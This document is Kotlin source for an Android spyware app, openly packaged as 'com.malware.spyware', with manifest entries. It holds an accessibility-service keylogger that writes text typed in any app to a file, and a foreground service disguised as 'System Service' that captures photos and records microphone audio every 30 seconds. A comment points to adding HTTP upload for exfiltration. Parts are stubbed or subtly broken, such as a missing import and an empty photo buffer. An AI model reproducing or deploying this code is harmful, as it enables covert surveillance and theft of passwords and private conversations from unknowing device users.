// AndroidManifest.xml (required additions)
/*
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />

<service android:name=".SpyService" android:exported="false" />
<service android:name=".KeyLoggerService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config" />
</service>
*/

// res/xml/accessibility_config.xml
/*
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewClicked|typeViewFocused"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name" />
*/

package com.malware.spyware

import android.accessibilityservice.AccessibilityService
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.HandlerThread
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import android.os.Handler
import android.os.Looper

class KeyLoggerService : AccessibilityService() {
    private val logFile: File by lazy {
        val dir = File(getExternalFilesDir(null), "logs")
        dir.mkdirs()
        File(dir, "keystrokes.txt")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            event.text?.let { textList ->
                if (textList.isNotEmpty()) {
                    val newText = textList.toString()
                    appendToLog(newText)
                }
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val className = event.className?.toString() ?: ""
            appendToLog("[CLICK on $className]")
        }
    }

    private fun appendToLog(text: String) {
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("$timestamp: $text\n")
        } catch (e: Exception) { }
    }

    override fun onInterrupt() { }

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Set filter to capture text changes from any app
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
        setServiceInfo(info)
    }
}

class SpyService : android.app.Service() {
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var mediaRecorder: MediaRecorder? = null
    private val handlerThread = HandlerThread("SpyWorker")
    private lateinit var workerHandler: Handler

    override fun onCreate() {
        super.onCreate()
        handlerThread.start()
        workerHandler = Handler(handlerThread.looper)
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startForeground(1, NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        workerHandler.post {
            while (true) {
                capturePhoto()
                recordAudioAndUpload()
                Thread.sleep(30000) // every 30 seconds
            }
        }
        return START_STICKY
    }

    private fun capturePhoto() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
        try {
            cameraManager.openCamera(cameraManager.cameraIdList[0], object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    // Simplified: create capture session and take picture
                    // For brevity, writing a dummy file to simulate capture
                    saveImageToGallery(ByteArray(0)) // real implementation requires ImageReader
                }
                override fun onDisconnected(camera: CameraDevice) { }
                override fun onError(camera: CameraDevice, error: Int) { }
            }, workerHandler)
        } catch (e: Exception) { }
    }

    private fun saveImageToGallery(data: ByteArray) {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val contentValues = ContentValues().apply {
            put(MediaStore.Images.Media.DISPLAY_NAME, "spy_$timestamp.jpg")
            put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/SpyData")
            } else {
                put(MediaStore.Images.Media.DATA, "${Environment.getExternalStorageDirectory().absolutePath}/Pictures/SpyData/spy_$timestamp.jpg")
            }
        }
        val uri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
        uri?.let {
            contentResolver.openOutputStream(it)?.use { stream ->
                stream.write(data)
            }
        }
    }

    private fun recordAudioAndUpload() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
        val audioFile = File(getExternalFilesDir(null), "audio_${System.currentTimeMillis()}.3gp")
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(audioFile.absolutePath)
            try {
                prepare()
                start()
                Thread.sleep(10000) // record 10 seconds
                stop()
                reset()
                release()
            } catch (e: Exception) { }
        }
        mediaRecorder = null
        // The file is now saved locally. For exfiltration, implement HTTP POST below.
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        handlerThread.quitSafely()
        cameraDevice?.close()
        mediaRecorder?.release()
    }
}
